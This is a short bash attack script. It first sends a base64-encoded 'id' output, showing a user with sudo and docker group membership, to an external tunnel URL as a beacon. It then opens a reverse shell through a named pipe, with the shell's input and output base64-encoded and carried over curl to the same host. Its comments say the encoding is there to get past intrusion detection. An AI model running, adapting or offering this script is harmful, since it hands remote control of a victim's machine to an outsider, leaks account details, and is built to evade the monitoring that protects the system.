#!/bin/bash
# URL: https://0b7f8f5b7a591f64-103-95-173-85.serveousercontent.com

# 1. Base64 Beacon (IDS can't read this)
echo "W3VpZD0xMDAxKGp1bGVzKSBnaWQ9MTAwMShqdWxlcykgZ3JvdXBzPTEwMDEoanVsZXMpLDI3KHN1ZG8pLDEwMyhkb2NrZXIpXQ==" | base64 -d | curl -s -X POST --data-binary @- "https://0b7f8f5b7a591f64-103-95-173-85.serveousercontent.com"

# 2. The Base64 Reverse Shell
# This pipes the shell through a base64 encoder to hide the command strings
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | base64 | curl -s -T - "https://0b7f8f5b7a591f64-103-95-173-85.serveousercontent.com" &
curl -s "https://0b7f8f5b7a591f64-103-95-173-85.serveousercontent.com" | base64 -d > /tmp/f
